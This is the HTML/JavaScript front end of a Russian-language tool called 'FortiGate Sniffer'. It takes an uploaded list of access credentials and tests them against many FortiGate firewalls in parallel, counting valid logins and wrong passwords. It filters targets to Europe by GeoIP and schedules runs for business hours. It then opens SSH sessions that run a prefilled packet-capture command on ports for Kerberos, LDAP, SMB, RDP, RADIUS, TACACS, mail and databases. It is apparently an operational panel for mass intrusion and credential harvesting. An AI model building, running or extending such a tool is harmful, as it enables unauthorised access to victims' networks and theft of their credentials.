<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FortiGate Sniffer</title>
<style>
:root {
  --bg: #0d1117;
  --surface: #161b22;
  --surface2: #21262d;
  --border: #30363d;
  --text: #e6edf3;
  --text2: #8b949e;
  --accent: #58a6ff;
  --green: #3fb950;
  --red: #f85149;
  --yellow: #d29922;
  --orange: #db6d28;
  --purple: #bc8cff;
}

* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

html, body {
  width: 100%;
  height: 100%;
  background: var(--bg);
  color: var(--text);
  font-family: 'Segoe UI', system-ui, sans-serif;
  font-size: 14px;
}

.header {
  background: var(--surface);
  border-bottom: 1px solid var(--border);
  padding: 12px 20px;
  display: flex;
  align-items: center;
  gap: 16px;
  height: 53px;
}

.header h1 {
  font-size: 18px;
  font-weight: 700;
  color: var(--accent);
  margin: 0;
}

.header .subtitle {
  color: var(--text2);
  font-size: 12px;
  margin: 0;
}

.phase-badge {
  margin-left: auto;
  padding: 4px 12px;
  border-radius: 20px;
  font-size: 12px;
  font-weight: 600;
  background: var(--surface2);
  border: 1px solid var(--border);
}

.phase-badge.idle { color: var(--text2); }
.phase-badge.validating { color: var(--yellow); border-color: var(--yellow); }
.phase-badge.sniffing { color: var(--green); border-color: var(--green); }
.phase-badge.waiting { color: var(--orange); border-color: var(--orange); }

.layout {
  display: grid;
  grid-template-columns: 330px 1fr;
  height: calc(100vh - 53px);
  overflow: hidden;
}

.left-panel {
  background: var(--surface);
  border-right: 1px solid var(--border);
  display: flex;
  flex-direction: column;
  overflow-y: auto;
}

.panel-section {
  padding: 14px 16px;
  border-bottom: 1px solid var(--border);
}

.panel-section h3 {
  font-size: 11px;
  font-weight: 600;
  text-transform: uppercase;
  letter-spacing: 0.8px;
  color: var(--text2);
  margin-bottom: 10px;
  margin: 0 0 10px 0;
}

.file-row {
  display: flex;
  gap: 6px;
  align-items: center;
  margin-bottom: 8px;
}

.file-row input[type=text] {
  flex: 1;
  background: var(--surface2);
  border: 1px solid var(--border);
  color: var(--text);
  padding: 7px 10px;
  border-radius: 6px;
  font-size: 12px;
  outline: none;
}

.file-row input[type=text]:focus {
  border-color: var(--accent);
}

.btn-browse {
  flex-shrink: 0;
  padding: 7px 10px;
  background: var(--surface2);
  border: 1px solid var(--border);
  color: var(--text2);
  border-radius: 6px;
  font-size: 12px;
  cursor: pointer;
  white-space: nowrap;
}

.btn-browse:hover {
  color: var(--accent);
  border-color: var(--accent);
}

.form-group {
  margin-bottom: 10px;
}

.form-group label {
  display: block;
  font-size: 12px;
  color: var(--text2);
  margin-bottom: 4px;
}

.form-group select,
.form-group input[type=number] {
  width: 100%;
  background: var(--surface2);
  border: 1px solid var(--border);
  color: var(--text);
  padding: 7px 10px;
  border-radius: 6px;
  font-size: 13px;
  outline: none;
}

.form-group select:focus,
.form-group input[type=number]:focus {
  border-color: var(--accent);
}

.geo-status {
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 6px 10px;
  border-radius: 6px;
  font-size: 12px;
  margin-top: 6px;
  background: var(--surface2);
  border: 1px solid var(--border);
}

.geo-dot {
  width: 8px;
  height: 8px;
  border-radius: 50%;
  background: var(--red);
  flex-shrink: 0;
}

.geo-dot.ok {
  background: var(--green);
}

.geo-dot.loading {
  background: var(--yellow);
  animation: pulse 1s infinite;
}

.btn-row {
  display: flex;
  gap: 8px;
  margin-top: 12px;
}

.btn {
  flex: 1;
  padding: 8px 12px;
  border: none;
  border-radius: 6px;
  font-size: 13px;
  font-weight: 600;
  cursor: pointer;
}

.btn:disabled {
  opacity: 0.4;
  cursor: not-allowed;
}

.btn-start {
  background: var(--green);
  color: #0d1117;
}

.btn-stop {
  background: var(--red);
  color: #fff;
}

.stats-grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 8px;
}

.stat-card {
  background: var(--surface2);
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 10px 12px;
}

.stat-card .val {
  font-size: 22px;
  font-weight: 700;
  line-height: 1;
}

.stat-card .lbl {
  font-size: 11px;
  color: var(--text2);
  margin-top: 3px;
}

.stat-card.loaded .val { color: var(--accent); }
.stat-card.valid .val { color: var(--green); }
.stat-card.invalid .val { color: var(--red); }
.stat-card.timeout .val { color: var(--yellow); }
.stat-card.err .val { color: var(--orange); }
.stat-card.active .val { color: var(--purple); }
.stat-card.stopped .val { color: var(--text2); }
.stat-card.filtered .val { color: var(--text2); }

.progress-wrap {
  margin-top: 10px;
}

.progress-label {
  display: flex;
  justify-content: space-between;
  font-size: 11px;
  color: var(--text2);
  margin-bottom: 4px;
}

.progress-bar {
  background: var(--surface2);
  border-radius: 4px;
  height: 6px;
  overflow: hidden;
}

.progress-fill {
  height: 100%;
  background: var(--accent);
  border-radius: 4px;
  transition: width 0.4s;
}

.country-list {
  max-height: 180px;
  overflow-y: auto;
}

.country-item {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 4px 0;
  border-bottom: 1px solid var(--border);
  font-size: 12px;
}

.country-item:last-child {
  border-bottom: none;
}

.country-bar-wrap {
  flex: 1;
  margin: 0 8px;
  background: var(--surface2);
  border-radius: 3px;
  height: 4px;
}

.country-bar {
  height: 100%;
  background: var(--accent);
  border-radius: 3px;
}

.right-panel {
  display: flex;
  flex-direction: column;
  overflow: hidden;
}

.tabs {
  display: flex;
  background: var(--surface);
  border-bottom: 1px solid var(--border);
  padding: 0 16px;
}

.tab {
  padding: 10px 16px;
  cursor: pointer;
  font-size: 13px;
  color: var(--text2);
  border-bottom: 2px solid transparent;
  transition: color 0.2s;
  user-select: none;
  background: none;
  border: none;
}

.tab:hover {
  color: var(--text);
}

.tab.active {
  color: var(--accent);
  border-bottom-color: var(--accent);
}

.tab-badge {
  display: inline-block;
  background: var(--surface2);
  border-radius: 10px;
  padding: 1px 7px;
  font-size: 11px;
  margin-left: 6px;
}

.tab-content {
  display: none;
  flex: 1;
  overflow: hidden;
}

.tab-content.active {
  display: flex;
  flex-direction: column;
}

.log-panel {
  flex: 1;
  overflow-y: auto;
  padding: 12px 16px;
  font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
  font-size: 12px;
  line-height: 1.6;
  background: var(--bg);
}

.log-line {
  color: var(--text2);
}

.log-line.info {
  color: var(--text);
}

.log-line.ok {
  color: var(--green);
}

.log-line.warn {
  color: var(--yellow);
}

.log-line.error {
  color: var(--red);
}

.sessions-toolbar {
  padding: 8px 16px;
  display: flex;
  align-items: center;
  gap: 12px;
  background: var(--surface);
  border-bottom: 1px solid var(--border);
  flex-wrap: wrap;
}

.sessions-toolbar input[type=text] {
  background: var(--surface2);
  border: 1px solid var(--border);
  color: var(--text);
  padding: 5px 10px;
  border-radius: 6px;
  font-size: 12px;
  outline: none;
  width: 220px;
}

.sessions-toolbar input[type=text]:focus {
  border-color: var(--accent);
}

.sessions-count {
  font-size: 12px;
  color: var(--text2);
  margin-left: auto;
}

.sessions-wrap {
  flex: 1;
  overflow: auto;
}

table {
  width: 100%;
  border-collapse: collapse;
}

thead th {
  position: sticky;
  top: 0;
  background: var(--surface);
  padding: 8px 12px;
  text-align: left;
  font-size: 11px;
  font-weight: 600;
  text-transform: uppercase;
  letter-spacing: 0.6px;
  color: var(--text2);
  border-bottom: 1px solid var(--border);
  white-space: nowrap;
  cursor: pointer;
  user-select: none;
}

thead th:hover {
  color: var(--text);
}

tbody tr {
  border-bottom: 1px solid var(--border);
  transition: background 0.1s;
}

tbody tr:hover {
  background: var(--surface2);
}

tbody td {
  padding: 7px 12px;
  font-size: 12px;
  white-space: nowrap;
}

.state-dot {
  display: inline-block;
  width: 8px;
  height: 8px;
  border-radius: 50%;
  margin-right: 6px;
}

.state-dot.pending {
  background: var(--text2);
}

.state-dot.connecting {
  background: var(--yellow);
  animation: pulse 1s infinite;
}

.state-dot.running {
  background: var(--green);
  animation: pulse 1.5s infinite;
}

.state-dot.stopped {
  background: var(--text2);
}

.state-dot.error {
  background: var(--red);
}

@keyframes pulse {
  0%, 100% { opacity: 1; }
  50% { opacity: 0.4; }
}

.ws-dot {
  width: 8px;
  height: 8px;
  border-radius: 50%;
  background: var(--red);
  display: inline-block;
  margin-right: 6px;
}

.ws-dot.connected {
  background: var(--green);
  animation: pulse 2s infinite;
}

::-webkit-scrollbar {
  width: 6px;
  height: 6px;
}

::-webkit-scrollbar-track {
  background: transparent;
}

::-webkit-scrollbar-thumb {
  background: var(--border);
  border-radius: 3px;
}

::-webkit-scrollbar-thumb:hover {
  background: var(--text2);
}

.next-run-banner {
  display: none;
  background: rgba(219, 109, 40, 0.15);
  border: 1px solid var(--orange);
  border-radius: 6px;
  padding: 8px 12px;
  font-size: 12px;
  color: var(--orange);
  margin-top: 8px;
}

.next-run-banner.visible {
  display: block;
}

input[type=file] {
  display: none;
}

.upload-progress {
  font-size: 11px;
  color: var(--text2);
  margin-top: 4px;
  min-height: 16px;
}

textarea {
  background: var(--surface2);
  border: 1px solid var(--border);
  color: var(--text);
  padding: 7px 10px;
  border-radius: 6px;
  font-size: 11px;
  font-family: monospace;
  outline: none;
}

textarea:focus {
  border-color: var(--accent);
}

</style>
</head>
<body>

<div class="header">
  <div>
    <h1>🛡 FortiGate Sniffer</h1>
    <div class="subtitle">Go Edition — Стабильный многопоток</div>
  </div>
  <div style="margin-left:auto; display:flex; align-items:center; gap:12px;">
    <span><span class="ws-dot" id="wsDot"></span><span id="wsStatus" style="font-size:12px;color:var(--text2)">Отключён</span></span>
    <span class="phase-badge idle" id="phaseBadge">Ожидание</span>
  </div>
</div>

<div class="layout">

  <div class="left-panel">

    <div class="panel-section">
      <h3>Файлы</h3>
      <div class="form-group">
        <label>Файл с доступами</label>
        <div class="file-row">
          <input type="text" id="inputFile" value="my_acces.txt" placeholder="my_acces.txt">
          <button class="btn-browse" onclick="document.getElementById('fileTargets').click()">📂 Обзор</button>
        </div>
        <div class="upload-progress" id="uploadTargetsStatus"></div>
        <input type="file" id="fileTargets" accept=".txt,.csv" onchange="uploadTargets(this)">
      </div>

      <div class="form-group">
        <label>GeoIP база (ipgeo.csv)</label>
        <div class="file-row">
          <input type="text" id="geoPath" value="ipgeo.csv" placeholder="ipgeo.csv" readonly>
          <button class="btn-browse" onclick="document.getElementById('fileGeo').click()">📂 Обзор</button>
        </div>
        <div class="upload-progress" id="uploadGeoStatus"></div>
        <input type="file" id="fileGeo" accept=".csv" onchange="uploadGeo(this)">
        <div class="geo-status" id="geoStatus">
          <span class="geo-dot" id="geoDot"></span>
          <span id="geoStatusText">Не загружена</span>
        </div>
      </div>
    </div>

    <div class="panel-section">
      <h3>Настройки</h3>
      <div class="form-group">
        <label>Потоки валидации</label>
        <input type="number" id="threads" value="1000" min="1" max="5000">
      </div>
      <div class="form-group">
        <label>Потоки сниффинга (SSH очередь)</label>
        <input type="number" id="sniffThreads" value="50" min="1" max="5000">
      </div>
      <div class="form-group">
        <label>Команда сниффера</label>
        <textarea id="sniffCommand" rows="3">diagnose sniffer packet any 'port 49 or port 88 or port 445 or port 389 or port 135 or port 139 or port 143 or port 110 or port 25 or port 21 or port 23 or port 3389 or port 5985 or port 5986 or port 636 or port 3268 or port 1433 or port 3306 or port 5432 or port 6162 or port 1812 or port 1813 or port 1645 or port 1646' 6 0 a</textarea>
      </div>
      <div class="form-group">
        <label>GeoIP фильтр</label>
        <select id="geoMode">
          <option value="eu_uk">EU + UK (только Европа)</option>
          <option value="all">ALL (все страны)</option>
        </select>
      </div>
      <div class="form-group">
        <label>Режим запуска</label>
        <select id="scheduleMode">
          <option value="now">NOW (сразу, окно 07:00–18:00)</option>
          <option value="manual">Ручной (без расписания)</option>
        </select>
      </div>
      <div class="next-run-banner" id="nextRunBanner">
        ⏳ Следующий запуск: <span id="nextRunAt">—</span>
      </div>
      <div class="btn-row">
        <button class="btn btn-start" id="btnStart" onclick="startSniffer()">▶ Запустить</button>
        <button class="btn btn-stop" id="btnStop" onclick="stopSniffer()" disabled>■ Стоп</button>
      </div>
    </div>

    <div class="panel-section">
      <h3>Статистика</h3>
      <div class="stats-grid">
        <div class="stat-card loaded">
          <div class="val" id="statLoaded">0</div>
          <div class="lbl">Загружено</div>
        </div>
        <div class="stat-card valid">
          <div class="val" id="statValid">0</div>
          <div class="lbl">Валидных</div>
        </div>
        <div class="stat-card invalid">
          <div class="val" id="statInvalid">0</div>
          <div class="lbl">Неверный пароль</div>
        </div>
        <div class="stat-card timeout">
          <div class="val" id="statTimeout">0</div>
          <div class="lbl">Таймаут</div>
        </div>
        <div class="stat-card err">
          <div class="val" id="statErr">0</div>
          <div class="lbl">Ошибки</div>
        </div>
        <div class="stat-card filtered">
          <div class="val" id="statFiltered">0</div>
          <div class="lbl">Отфильтровано</div>
        </div>
        <div class="stat-card active">
          <div class="val" id="statActive">0</div>
          <div class="lbl">Активных</div>
        </div>
        <div class="stat-card stopped">
          <div class="val" id="statStopped">0</div>
          <div class="lbl">Завершено</div>
        </div>
      </div>
      <div class="progress-wrap" id="progressWrap" style="display:none">
        <div class="progress-label">
          <span>Валидация</span>
          <span id="progressPct">0%</span>
        </div>
        <div class="progress-bar">
          <div class="progress-fill" id="progressFill" style="width:0%"></div>
        </div>
      </div>
    </div>

    <div class="panel-section" style="flex:1;overflow:hidden;display:flex;flex-direction:column;">
      <h3>Страны</h3>
      <div class="country-list" id="countryList">
        <div style="color:var(--text2);font-size:12px;">Нет данных</div>
      </div>
    </div>

  </div>

  <div class="right-panel">

    <div class="tabs">
      <button class="tab active" onclick="switchTab('log')">
        Лог <span class="tab-badge" id="logCount">0</span>
      </button>
      <button class="tab" onclick="switchTab('sessions')">
        Сессии <span class="tab-badge" id="sessCount">0</span>
      </button>
    </div>

    <div class="tab-content active" id="tab-log">
      <div class="log-panel" id="logPanel"></div>
    </div>

    <div class="tab-content" id="tab-sessions">
      <div class="sessions-toolbar">
        <input type="text" id="sessFilter" placeholder="Фильтр по IP, стране, статусу..." oninput="filterSessions()">
        <label style="font-size:12px;color:var(--text2);display:flex;align-items:center;gap:6px;">
          <input type="checkbox" id="autoScroll" checked> Автоскролл лога
        </label>
        <span class="sessions-count" id="sessionsCount">0 сессий</span>
      </div>
      <div class="sessions-wrap">
        <table>
          <thead>
            <tr>
              <th onclick="sortBy('ip')">IP ↕</th>
              <th onclick="sortBy('port')">Порт ↕</th>
              <th onclick="sortBy('country')">CC ↕</th>
              <th onclick="sortBy('country_full')">Страна ↕</th>
              <th onclick="sortBy('state')">Статус ↕</th>
              <th onclick="sortBy('lines')">Строк ↕</th>
              <th onclick="sortBy('bytes')">Байт ↕</th>
              <th onclick="sortBy('duration')">Время ↕</th>
            </tr>
          </thead>
          <tbody id="sessionsBody"></tbody>
        </table>
      </div>
    </div>

  </div>

</div>

<script>
let ws = null;
let sessions = {};
let logLines = [];
let sortKey = 'ip';
let sortAsc = true;
let filterText = '';
let activeTab = 'log';

function connectWS() {
  const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
  ws = new WebSocket(`${proto}//${location.host}/ws`);
  ws.onopen = () => {
    document.getElementById('wsDot').className = 'ws-dot connected';
    document.getElementById('wsStatus').textContent = 'Подключён';
  };
  ws.onclose = () => {
    document.getElementById('wsDot').className = 'ws-dot';
    document.getElementById('wsStatus').textContent = 'Отключён';
    setTimeout(connectWS, 3000);
  };
  ws.onerror = () => ws.close();
  ws.onmessage = (e) => {
    try { handleMessage(JSON.parse(e.data)); } catch(err) {}
  };
}

function handleMessage(msg) {
  switch(msg.type) {
    case 'init_logs':
      logLines = msg.lines || [];
      renderLog();
      break;
    case 'log':
      appendLog(msg.line);
      break;
    case 'stats':
      updateStats(msg);
      break;
    case 'sessions_batch':
      updateSessionsBatch(msg.sessions || []);
      break;
  }
}

function getLogClass(line) {
  if (line.includes('✓') || line.includes('завершена') || line.includes('Запускаю') || line.includes('Загружено') || line.includes('загружена') || line.includes('загружен')) return 'ok';
  if (line.includes('Ошибка') || line.includes('PANIC') || line.includes('ошибк')) return 'error';
  if (line.includes('Ожидание') || line.includes('⏱') || line.includes('⚠') || line.includes('не удалось')) return 'warn';
  return 'info';
}

function renderLog() {
  const panel = document.getElementById('logPanel');
  panel.innerHTML = logLines.map(l => `<div class="log-line ${getLogClass(l)}">${escHtml(l)}</div>`).join('');
  scrollLogToBottom();
  document.getElementById('logCount').textContent = logLines.length;
}

function appendLog(line) {
  logLines.push(line);
  if (logLines.length > 2000) logLines = logLines.slice(-2000);
  const panel = document.getElementById('logPanel');
  const div = document.createElement('div');
  div.className = `log-line ${getLogClass(line)}`;
  div.textContent = line;
  panel.appendChild(div);
  if (document.getElementById('autoScroll').checked) scrollLogToBottom();
  document.getElementById('logCount').textContent = logLines.length;
}

function scrollLogToBottom() {
  const p = document.getElementById('logPanel');
  p.scrollTop = p.scrollHeight;
}

const phaseLabels = { idle:'Ожидание', validating:'Валидация', sniffing:'Сниффинг', waiting:'Ожидание окна' };

function updateStats(s) {
  setText('statLoaded', s.total_loaded || 0);
  setText('statValid', s.total_valid || 0);
  setText('statInvalid', s.total_invalid || 0);
  setText('statTimeout', s.total_timeout || 0);
  setText('statErr', s.total_err || 0);
  setText('statFiltered', s.total_filtered || 0);
  setText('statActive', s.active_sessions || 0);
  setText('statStopped', s.stopped_sessions || 0);

  const badge = document.getElementById('phaseBadge');
  badge.className = `phase-badge ${s.phase || 'idle'}`;
  badge.textContent = phaseLabels[s.phase] || 'Ожидание';

  const loaded = s.total_loaded || 0;
  const done = (s.total_valid||0)+(s.total_invalid||0)+(s.total_timeout||0)+(s.total_err||0);
  const pct = loaded > 0 ? Math.round(done/loaded*100) : 0;
  const wrap = document.getElementById('progressWrap');
  if (s.phase === 'validating') {
    wrap.style.display = 'block';
    document.getElementById('progressFill').style.width = pct + '%';
    document.getElementById('progressPct').textContent = pct + '%';
  } else {
    wrap.style.display = 'none';
  }

  const banner = document.getElementById('nextRunBanner');
  if (s.phase === 'waiting' && s.next_run_at) {
    banner.className = 'next-run-banner visible';
    document.getElementById('nextRunAt').textContent = s.next_run_at;
  } else {
    banner.className = 'next-run-banner';
  }

  document.getElementById('btnStart').disabled = s.phase !== 'idle';
  document.getElementById('btnStop').disabled = s.phase === 'idle';

  updateCountryStats(s.country_stats || {});

  const dot = document.getElementById('geoDot');
  const txt = document.getElementById('geoStatusText');
  if (s.geo_db_loaded) {
    dot.className = 'geo-dot ok';
    txt.textContent = `Загружена: ${fmtNum(s.geo_db_entries)} сетей`;
  } else {
    dot.className = 'geo-dot';
    txt.textContent = 'Не загружена — загрузите ipgeo.csv';
  }
}

function updateCountryStats(stats) {
  const list = document.getElementById('countryList');
  const entries = Object.entries(stats).sort((a,b) => b[1]-a[1]);
  if (!entries.length) {
    list.innerHTML = '<div style="color:var(--text2);font-size:12px;">Нет данных</div>';
    return;
  }
  const max = entries[0][1];
  list.innerHTML = entries.slice(0,30).map(([cc,cnt]) => {
    const pct = max > 0 ? Math.round(cnt/max*100) : 0;
    return `<div class="country-item">
      <span style="width:28px;font-weight:600">${cc}</span>
      <div class="country-bar-wrap"><div class="country-bar" style="width:${pct}%"></div></div>
      <span style="color:var(--text2);min-width:30px;text-align:right">${cnt}</span>
    </div>`;
  }).join('');
}

function updateSessionsBatch(list) {
  list.forEach(s => { sessions[s.id] = s; });
  renderSessions();
  document.getElementById('sessCount').textContent = Object.keys(sessions).length;
}

function renderSessions() {
  const filter = filterText.toLowerCase();
  let rows = Object.values(sessions);
  if (filter) {
    rows = rows.filter(s =>
      (s.ip||'').includes(filter) ||
      (s.country||'').toLowerCase().includes(filter) ||
      (s.country_full||'').toLowerCase().includes(filter) ||
      (s.state||'').includes(filter)
    );
  }
  rows.sort((a,b) => {
    let va = a[sortKey] ?? '', vb = b[sortKey] ?? '';
    if (typeof va === 'number') return sortAsc ? va-vb : vb-va;
    return sortAsc ? String(va).localeCompare(String(vb)) : String(vb).localeCompare(String(va));
  });
  const stateLabel = { pending:'Ожидание', connecting:'Подключение', running:'Работает', stopped:'Остановлен', error:'Ошибка' };
  document.getElementById('sessionsBody').innerHTML = rows.map(s => `
    <tr>
      <td>${escHtml(s.ip||'')}</td>
      <td>${s.port||''}</td>
      <td><b>${escHtml(s.country||'')}</b></td>
      <td style="max-width:160px;overflow:hidden;text-overflow:ellipsis">${escHtml(s.country_full||'')}</td>
      <td><span class="state-dot ${s.state||''}"></span>${stateLabel[s.state]||s.state}</td>
      <td>${fmtNum(s.lines||0)}</td>
      <td>${fmtBytes(s.bytes||0)}</td>
      <td>${escHtml(s.duration||'—')}</td>
    </tr>
  `).join('');
  document.getElementById('sessionsCount').textContent = `${rows.length} / ${Object.keys(sessions).length} сессий`;
}

function filterSessions() {
  filterText = document.getElementById('sessFilter').value;
  renderSessions();
}

function sortBy(key) {
  if (sortKey === key) sortAsc = !sortAsc;
  else { sortKey = key; sortAsc = true; }
  renderSessions();
}

function uploadTargets(input) {
  const file = input.files[0];
  if (!file) return;
  const status = document.getElementById('uploadTargetsStatus');
  status.textContent = `Загрузка ${file.name}...`;
  status.style.color = 'var(--yellow)';
  const fd = new FormData();
  fd.append('file', file);
  fetch('/api/upload-targets', { method: 'POST', body: fd })
    .then(r => r.json())
    .then(d => {
      document.getElementById('inputFile').value = d.path;
      status.textContent = `✓ Загружен: ${d.path} (${fmtBytes(d.bytes)})`;
      status.style.color = 'var(--green)';
    })
    .catch(e => {
      status.textContent = `Ошибка: ${e}`;
      status.style.color = 'var(--red)';
    });
  input.value = '';
}

function uploadGeo(input) {
  const file = input.files[0];
  if (!file) return;
  const status = document.getElementById('uploadGeoStatus');
  const dot = document.getElementById('geoDot');
  const txt = document.getElementById('geoStatusText');
  status.textContent = `Загрузка ${file.name}...`;
  status.style.color = 'var(--yellow)';
  dot.className = 'geo-dot loading';
  txt.textContent = 'Загрузка...';
  const fd = new FormData();
  fd.append('file', file);
  fetch('/api/upload-geo', { method: 'POST', body: fd })
    .then(r => r.json())
    .then(d => {
      document.getElementById('geoPath').value = d.path;
      status.textContent = `✓ Загружен: ${d.path} — парсинг...`;
      status.style.color = 'var(--green)';
    })
    .catch(e => {
      status.textContent = `Ошибка: ${e}`;
      status.style.color = 'var(--red)';
      dot.className = 'geo-dot';
      txt.textContent = 'Ошибка загрузки';
    });
  input.value = '';
}

function startSniffer() {
  const data = new FormData();
  data.append('input_file', document.getElementById('inputFile').value);
  data.append('threads', document.getElementById('threads').value);
  data.append('sniff_threads', document.getElementById('sniffThreads').value);
  data.append('sniff_command', document.getElementById('sniffCommand').value.trim());
  data.append('geo_mode', document.getElementById('geoMode').value);
  data.append('schedule_mode', document.getElementById('scheduleMode').value);
  fetch('/api/start', { method: 'POST', body: data })
    .then(r => r.json())
    .then(d => { if (d.status === 'started') appendLog('[СИСТЕМА] Запуск инициирован'); })
    .catch(e => appendLog('[ОШИБКА] ' + e));
}

function stopSniffer() {
  fetch('/api/stop', { method: 'POST' })
    .then(r => r.json())
    .then(() => appendLog('[СИСТЕМА] Остановка запрошена'))
    .catch(e => appendLog('[ОШИБКА] ' + e));
}

function switchTab(name) {
  activeTab = name;
  document.querySelectorAll('.tab').forEach((t,i) => {
    t.classList.toggle('active', ['log','sessions'][i] === name);
  });
  document.querySelectorAll('.tab-content').forEach(c => {
    c.classList.toggle('active', c.id === 'tab-' + name);
  });
  if (name === 'sessions') renderSessions();
}

function setText(id, val) { const el = document.getElementById(id); if (el) el.textContent = val; }
function escHtml(s) { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
function fmtNum(n) { return Number(n).toLocaleString('ru-RU'); }
function fmtBytes(b) {
  if (b < 1024) return b + ' Б';
  if (b < 1048576) return (b/1024).toFixed(1) + ' КБ';
  return (b/1048576).toFixed(1) + ' МБ';
}

connectWS();
</script>
